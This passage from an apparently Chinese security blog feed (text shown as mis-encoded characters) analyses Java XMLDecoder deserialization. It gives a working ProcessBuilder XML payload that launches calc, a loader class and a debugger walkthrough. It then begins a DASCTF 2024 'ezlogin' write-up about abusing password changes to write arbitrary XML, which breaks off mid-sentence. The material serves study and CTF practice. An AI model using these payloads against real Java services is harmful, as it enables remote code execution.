class="hljs-params">(<span class="hljs-type">char</span>[] ch, <span class="hljs-type">int</span> start, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;characters()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.characters(ch, start, length);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.startDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endDocument()&quot;</span>);<br>        <span class="hljs-built_in">super</span>.endDocument();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startElement</span><span class="hljs-params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;startElement()&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; attributes.getLength(); i++) &#123;<br>            <span class="hljs-comment">// getQName()æ˜¯è·å–å±æ€§åç§°ï¼Œ</span><br>            System.out.println(attributes.getQName(i) + <span class="hljs-string">&quot;=&quot;</span> + attributes.getValue(i));<br>        &#125;<br>        <span class="hljs-built_in">super</span>.startElement(uri, localName, qName, attributes);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">endElement</span><span class="hljs-params">(String uri, String localName, String qName)</span> <span class="hljs-keyword">throws</span> SAXException &#123;<br>        System.out.println(<span class="hljs-string">&quot;endElement()&quot;</span>);<br>        System.out.println(uri + localName + qName);<br>        <span class="hljs-built_in">super</span>.endElement(uri, localName, qName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè§£æå‰é¢çš„person.xmlï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">startDocument()<br>startElement()<br>version=1.8.0_65<br>class=java.beans.XMLDecoder<br>characters()<br>startElement()<br>class=org.example.XMLTest.Person<br>characters()<br>startElement()<br>property=age<br>characters()<br>startElement()<br>characters()<br>endElement()<br>int<br>characters()<br>endElement()<br>void<br>characters()<br>startElement()<br>property=name<br>characters()<br>startElement()<br>characters()<br>endElement()<br>string<br>characters()<br>endElement()<br>void<br>characters()<br>endElement()<br>object<br>characters()<br>endElement()<br>java<br>endDocument()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»§æ‰¿SAXçš„DefaultHandlerç±»ï¼Œé‡å†™å…¶äº‹ä»¶æ–¹æ³•ï¼Œå°±èƒ½æ‹¿åˆ°XMLå¯¹åº”çš„èŠ‚ç‚¹ã€å±æ€§å’Œå€¼ã€‚</p><p>XMLDecoderä¹Ÿæ˜¯åŸºäºSAXå®ç°çš„xmlè§£æï¼Œä¸è¿‡ä»–æ‹¿åˆ°èŠ‚ç‚¹ã€å±æ€§ã€å€¼ä¹‹åé€šè¿‡Expressionåˆ›å»ºå¯¹è±¡åŠè°ƒç”¨æ–¹æ³•ã€‚</p><h1 id="ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´åŸç†"></a>ååºåˆ—åŒ–æ¼æ´åŸç†</h1><p>æ¦‚æ‹¬æ¥è¯´ï¼ŒXMLDecoderäº§ç”Ÿæ¼æ´çš„åŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå…³é”®å› ç´ ï¼š</p><ul><li>XMLDecoderæ˜¯javaè‡ªå¸¦çš„ä»¥SAXæ–¹å¼è§£æxmlçš„ç±»ï¼Œå…¶åœ¨ååºåˆ—åŒ–ç»è¿‡ç‰¹æ®Šæ„é€ çš„XMLæ•°æ®å¯ä»¥è¦†ç›–å¯¹åº”Beansæˆå‘˜å€¼ï¼Œè¿™ç»™æ„é€ gadgetäº§ç”Ÿäº†å¯èƒ½ã€‚</li><li>XMLDecoderä½¿ç”¨åå°„æ¥åŠ¨æ€ç”ŸæˆBeansï¼Œè¿™ç»™è§¦å‘gadgetäº§ç”Ÿäº†å¯èƒ½ã€‚</li></ul><p>ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶åŒæ—¶éƒ½å…·å¤‡ï¼Œä½¿å¾—XMLDecoderäº§ç”Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„æ”»å‡»é¢ã€‚</p><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>è¿™é‡Œç”¨ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„payloadå»åˆ†æä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.XMLDecoder;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        File file=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;payload.xml&quot;</span>);<br>        FileInputStream fileInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>        BufferedInputStream bufferedInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fileInputStream);<br>        XMLDecoder xmlDecoder=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLDecoder</span>(bufferedInputStream);<br>        xmlDecoder.readObject();<br>        xmlDecoder.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥åœ¨ProcessBuilder#startå¤„æ‰“ä¸ªæ–­ç‚¹ç„¶åä»è°ƒç”¨æ ˆå¸§å¼€å§‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241025230809734.png" alt="image-20241025230809734"></p><p>ä»–æ˜¯ä»readObjectæ–¹æ³•å¼€å§‹çš„ï¼Œæˆ‘ä»¬ä»é‚£é‡Œå¼€å§‹è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241025231157408.png" alt="image-20241025231157408"></p><p>è·Ÿè¿›åˆ°XMLDecoder#parsingCompleteæ–¹æ³•ï¼Œè¿™é‡Œä¼šè°ƒç”¨DocumentHandlerè¿›è¡Œxmlçš„è§£æ</p><p><img src="https://cdn.clown2024.cn/image-20241025231439438.png" alt="image-20241025231439438"></p><p>è¿™ä¸ªhandlerå°±æ˜¯ç»§æ‰¿DefaultHandlerç±»çš„ï¼Œè°ƒç”¨ä»–çš„parseæ¥å¯¹è¾“å…¥inputè¿›è¡Œè§£æï¼Œä¹Ÿå°±æ˜¯ä»¥SAXæ–¹å¼è§£æ</p><p><img src="https://cdn.clown2024.cn/image-20241026004719002.png" alt="image-20241026004719002"></p><p>è¿›åˆ°æ–¹æ³•é‡Œé¢ï¼Œä»–çš„è§£æå†™æ³•ä¹Ÿå’Œæˆ‘ä»¬å‰é¢å†™çš„é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œéƒ½è¦åˆ›å»ºä¸€ä¸ªSAXParserï¼Œç„¶åæ¥ä¸‹æ¥çš„è§£æå°±é‡ç‚¹å»å…³æ³¨ä¸€ä¸‹ä»–çš„è§£æå‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><p>åœ¨DocumentHandlerçš„æ„é€ æ–¹æ³•ä¸­æŒ‡å®šäº†å¯ç”¨çš„æ ‡ç­¾ç±»å‹</p><p><img src="https://cdn.clown2024.cn/image-20241026005350433.png" alt="image-20241026005350433"></p><p>å¯¹åº”äº†com.sun.beans.decoderåŒ…ä¸­ç±»</p><p>æˆ‘ä»¬æ–­åœ¨DocumentHandler#startElementæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026012931997.png" alt="image-20241026012931997"></p><p>ä»–é¦–å…ˆè§£æjavaæ ‡ç­¾ï¼Œè®¾ç½®Ownerå’ŒParent,ownerå°±æ˜¯DocumentHandlerç±»ï¼ŒgetElementHandleræ–¹æ³•å°±æ˜¯ä»DocumentHandleræ„é€ æ–¹æ³•æ—¶åˆ›å»ºçš„mapä¸­å–å¯¹åº”çš„classï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.clown2024.cn/image-20241026014426012.png" alt="image-20241026014426012"></p><p>ç„¶ååˆ°è§£æobjectæ ‡ç­¾çš„æ—¶å€™ï¼Œä¼šå»æ‹¿nameå’Œvalueä¹Ÿå°±æ˜¯classå’ŒProcessBuilder</p><p>ç„¶åå°±æ˜¯é€šè¿‡addAttributeæ¥æ·»åŠ å±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241026014707208.png" alt="image-20241026014707208"></p><p>è¿™é‡Œè¿˜ä¼šè°ƒç”¨findClassï¼Œè¿™é‡Œæ˜¯ç½‘ä¸Šèµ°åˆ°äº†çˆ¶ç±»NewElementHandlerçš„è¿™ä¸ªæ–¹æ³•</p><p>ç„¶åå°±æ˜¯è§£æarrayæ ‡ç­¾ï¼ŒåŒæ ·æ·»åŠ å±æ€§ï¼Œåé¢å°±æ˜¯é‡å¤çš„è¿‡ç¨‹ï¼Œè‡ªå·±è°ƒè¯•çœ‹ä¸€éå³å¯</p><p>è§£æå®Œå¼€å§‹æ ‡ç­¾å°±åˆ°é—­åˆæ ‡ç­¾äº†</p><p>è¿›å…¥åˆ°endElementæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026015510343.png" alt="image-20241026015510343"></p><p>é¦–å…ˆå°±æ˜¯é—­åˆçš„stringæ ‡ç­¾</p><p><img src="https://cdn.clown2024.cn/image-20241026015649368.png" alt="image-20241026015649368"></p><p>æ¥ç€é—­åˆvoidå’Œarray</p><p>ç„¶åè§£ævoidæ ‡ç­¾çš„çš„methodå±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241026015858555.png" alt="image-20241026015858555"></p><p>å°†this.methodèµ‹å€¼ä¸ºstartï¼Œç„¶åç´§æ¥ç€åˆæ˜¯ç›¸å…³çš„é—­åˆæ“ä½œ</p><p>ä¸­é—´çš„å¾ˆå¤šå¤§åŒå°å¼‚çš„æµç¨‹å°±ä¸è®°å½•äº†ï¼Œçœ‹çœ‹æ–‡ç« å³å¯</p><p>æœ€ç»ˆèµ°åˆ°å…³é”®çš„åœ°æ–¹<strong>ObjectElementHandler#getValueObject</strong>æ–¹æ³•é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241026020414044.png" alt="image-20241026020414044"></p><p>è¿™é‡Œæ˜¯æ„å»ºäº†ä¸€ä¸ªjava.beans.Expressionè¡¨è¾¾å¼ç±»</p><p><img src="https://cdn.clown2024.cn/image-20241026020515551.png" alt="image-20241026020515551"></p><p>ç„¶åçœ‹Expressionçš„getValueæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026020824998.png" alt="image-20241026020824998"></p><p>é‡Œé¢ä¼šè°ƒç”¨invokeæ–¹æ³•ï¼Œä¼šèµ°åˆ°å…¶çˆ¶ç±»Statementçš„invokeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026021017273.png" alt="image-20241026021017273"></p><p><img src="https://cdn.clown2024.cn/image-20241026021656440.png" alt="image-20241026021656440"></p><p>å†…éƒ¨å°±æ˜¯åˆ©ç”¨åå°„æ¥è¿›è¡Œæ–¹æ³•è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241026021040905.png" alt="image-20241026021040905"></p><p>æœ€ç»ˆå°±ä¼šè¿”å›ProcessBuilderè¿™ä¸ªç±»ï¼Œç»§ç»­å¾€å</p><p><img src="https://cdn.clown2024.cn/image-20241026021157722.png" alt="image-20241026021157722"></p><p>åˆ°è¿™é‡Œä»–å°±ä¼šæ‰§è¡Œstartæ–¹æ³•ï¼Œå†…éƒ¨ä¹Ÿæ˜¯åå°„è°ƒç”¨startæ–¹æ³•ï¼Œåç»­çš„æ­¥éª¤ä¹Ÿæ˜¯å·®ä¸å¤šçš„å°±ä¸è°ƒäº†</p><p>æœ€ç»ˆå°±æ˜¯ç›¸å½“äºæœ€åæ‹¼æ¥äº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼š<strong>new java.lang.ProcessBuilder(new String[]{â€œcalcâ€}).start();</strong></p><h2 id="expressionå’Œstatement"><a href="#Expressionå’ŒStatement" class="headerlink" title="Expressionå’ŒStatement"></a>Expressionå’ŒStatement</h2><p>ä¸¤è€…éƒ½æ˜¯javaåå°„çš„å°è£…</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;ä½ å¥½ %s!&quot;</span>, name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><span class="hljs-keyword">import</span> java.beans.Expression;<br><span class="hljs-keyword">import</span> java.beans.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        testStatement();<br>        testExpression();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStatement</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Statement</span>(user, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>&#125;);<br>            statement.execute();<br>            System.out.println(user.getName());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testExpression</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Expression</span>(user, <span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;å°æ˜&quot;</span>&#125;);<br>            System.out.println(expression.getValue());<span class="hljs-comment">//å¯ä»¥è·å–è¿”å›å€¼</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å¼ ä¸‰<br>ä½ å¥½ å°æ˜!<br></code></pre></td></tr></table></figure><p>ä»–ä»¬çš„åŒºåˆ«å°±æ˜¯Expressionçš„getValueå†…éƒ¨æ‰§è¡Œinvokeæ–¹æ³•åèƒ½å¤Ÿè·å–è¿”å›å€¼ï¼Œè€ŒStatementæ˜¯æ²¡æœ‰getValueæ–¹æ³•æ˜¯è·å–ä¸äº†è¿”å›å€¼çš„</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>XMLDecoderå¯¼è‡´æ¼æ´çš„åŸå› å°±åœ¨äºå¤„ç†èŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¿¡ä»»äº†å¤–éƒ¨è¾“å…¥çš„XMLæŒ‡å®šèŠ‚ç‚¹ç±»å‹ä¿¡æ¯ï¼ˆclassç±»å‹èŠ‚ç‚¹ï¼‰ï¼ŒåŒæ—¶åœ¨è¿›è¡ŒèŠ‚ç‚¹ExpressionåŠ¨æ€å®ä¾‹åŒ–çš„æ—¶å€™ï¼ˆé€šè¿‡invokeå®ç°set()æ–¹æ³•ï¼Œå…è®¸èŠ‚ç‚¹å±æ€§ç”±XMLä»»æ„æ§åˆ¶</p><p>å¯¼è‡´Expressionçš„set()æ–¹æ³•è¢«é‡è½½ä¸ºé£é™©å‡½æ•°ï¼ˆæœ¬ä¾‹ä¸­æ˜¯startï¼‰ã€‚ExpressionåŠ¨æ€è§£æå› ä¸ºJavaåå°„ç‰¹æ€§å®ç°äº†ä»£ç æ‰§è¡Œã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://y4er.com/posts/java-xmldecoder">https://y4er.com/posts/java-xmldecoder</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17814641.html">https://www.cnblogs.com/LittleHann/p/17814641.html</a></p>]]></content>
      
      
      <categories>
          
          <category> true </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2024é‡‘ç§‹åæœˆéƒ¨åˆ†é¢˜ç›®å¤ç°</title>
      <link href="/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å®˜æ–¹wpé“¾æ¥ï¼š<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS">https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS</a></p><h1 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h1><p>å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç çš„æœåŠ¡ï¼Œçœ‹äº†ä¸€ä¸‹jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241023135607557.png" alt="image-20241023135607557"></p><p>è§åˆ°ç†Ÿæ‚‰çš„hutoolï¼Œå‰é¢çš„ciscné¢˜ç›®å¤ç°æ‰é‡åˆ°ï¼Œç„¶åspring-booté‚£å°±æ˜¯æœ‰jackson</p><p>å½“æ—¶å®¡äº†åŠå¤©çš„é€»è¾‘ï¼Œå‘ç°èƒ½ç»™ä¼ å‚çš„å‚æ•°é•¿åº¦éƒ½é™åˆ¶æ­»äº†ï¼Œä»–æœ‰ä¸€ä¸ªé»˜è®¤çš„xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- this is /user/AAAAAA.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä»–çš„ç”¨æˆ·åå’Œå¯†ç çš„æœ€å¤§é•¿åº¦éƒ½æ˜¯ä»¥è¯¥æ–‡ä»¶é‡Œé¢çš„é•¿åº¦ä¸ºå‡†</p><p><img src="https://cdn.clown2024.cn/image-20241023140248515.png" alt="image-20241023140248515"></p><p>è¿™é‡Œæœ‰ä¸ªcheckå‡½æ•°é™åˆ¶é•¿åº¦ï¼Œä¸€å¼€å§‹æ²¡æ‰¾åˆ°ä»€ä¹ˆç»•è¿‡çš„åœ°æ–¹ï¼Œé‚æ‘†ğŸ˜Š</p><p>è¿™é‡Œå¼€å§‹è·Ÿç€wpå¤ç°</p><p>çœ‹EditControllerå†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241026104501910.png" alt="image-20241026104501910"></p><p>è¿™é‡Œä»JSESSIONä¸­è·å–ç™»å½•çš„ç”¨æˆ·ï¼Œç„¶åå¯¹ç”¨æˆ·åå’Œæ–°å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œå†è¿›è¡Œä¿®æ”¹å¯†ç çš„æ“ä½œ</p><p>çœ‹ä¸€ä¸‹ä»–çš„changePasswordæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026105025765.png" alt="image-20241026105025765"></p><p>è¿™é‡Œå°±æ˜¯ç®€å•çš„å°†xmlçš„å†…å®¹è¯»å‡ºæ¥ï¼Œç„¶åè¿›è¡Œæ–°æ—§å¯†ç çš„æ›¿æ¢ï¼Œæœ€åé‡æ–°å†™å…¥ï¼Œæ³¨æ„è¿™é‡Œæ²¡æœ‰å¯¹JSESSIONçš„çŠ¶æ€æ”¹å˜</p><p>åœ¨delç”¨æˆ·çš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241026105354581.png" alt="image-20241026105354581"></p><p>ä¹Ÿæ˜¯ä»JSESSIONä¸­è·å–ç”¨æˆ·ç„¶åè°ƒç”¨delUseræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026105441155.png" alt="image-20241026105441155"></p><p>è¿™é‡Œç›´æ¥å°±æŠŠuserFileç»™åˆ é™¤äº†ï¼Œä½†æ˜¯ä»–å¹¶æ²¡æœ‰é‡ç½®JSESSIONï¼Œæ„æ€å°±æ˜¯æˆ‘ä»¬çš„JSESSIONå¯ä»¥ä¿ç•™ä¸‹æ¥ï¼Œä»–è¿˜æ˜¯èƒ½å¤Ÿè¯†åˆ«çš„</p><p>ååºåˆ—åŒ–çš„ç‚¹åœ¨äºloginè·¯ç”±</p><p><img src="https://cdn.clown2024.cn/image-20241026110213423.png" alt="image-20241026110213423"></p><p>çœ‹ä»–çš„loginæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241026110247575.png" alt="image-20241026110247575"></p><p>é‡Œé¢çš„ä¸€ä¸ªreadUseræ–¹æ³•æœ‰å¯¹xmlæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åæœ‰ä¸ªwafè¿‡æ»¤äº†java.ã€springframework.ã€hutool.ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†æ–‡ä»¶çš„æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯ä»–åˆå§‹ç»™æˆ‘ä»¬çš„é‚£ä¸ªAAAAAA.xmlçš„é•¿åº¦</p><p><img src="https://cdn.clown2024.cn/image-20241026123012865.png" alt="image-20241026123012865"></p><p>çœ‹å®Œå‰é¢ä¹‹åæ¼æ´ç‚¹å°±åœ¨äºchangePasswordçš„æ—¶å€™ï¼Œå› ä¸ºJSESSIONçš„çŠ¶æ€å¹¶æ²¡æœ‰æ”¹å˜ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬replaceçš„æ—¶å€™å¯ä»¥ä¿è¯oldPasswordæ˜¯ä¸€ç›´ä¸å˜çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤šæ¬¡è¯·æ±‚ä¿®æ”¹å¯†ç ï¼Œä¸€ç›´æ›¿æ¢oldPasswordæ¥å®ç°ä»»æ„å†…å®¹çš„å†™å…¥ï¼Œæ¯”å¦‚å¯ä»¥xxx&#x3D;ã€‹abcxxxï¼Œabcxxx&#x3D;ã€‹abcabcxxxï¼›</p><blockquote><p>æˆ‘ä»¬æ›¿æ¢çš„æ—¶å€™æ–°å¯†ç éœ€è¦åŠ ä¸Šæ—§å¯†ç ï¼Œè¿™æ 